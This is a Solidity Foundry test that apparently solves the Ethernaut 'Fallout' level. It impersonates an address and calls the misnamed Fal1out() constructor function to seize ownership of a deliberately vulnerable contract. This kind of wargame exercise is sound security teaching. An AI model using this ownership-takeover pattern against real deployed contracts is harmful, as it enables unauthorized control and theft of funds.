// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallout.sol";

contract FalloutAttack is Test {
    Fallout public fallout;
    address payable p1 =
        payable(address(0x35524A1a02D6C89C8FceAd21644cB61b032BD3DE));

    /// @dev funds p1 with amount in ether
    function fund(uint256 _amount) public payable returns (bool) {
        bool sent = p1.send(_amount * 1 ether);
        require(sent, "funding tx did not work");
        require(p1.balance == 1 ether, "p1 does not have 1 eth");
        return sent;
    }

    /// @dev setup function runs before each test
    function setUp() public {
        // owner of contract will be zero address
        fallout = new Fallout();
    }

    /// @dev Makes p1 the owner
    function testAttack() public payable {
        vm.prank(p1, p1);
        fallout.Fal1out();
        assertEq(fallout.owner(), p1);
    }
}
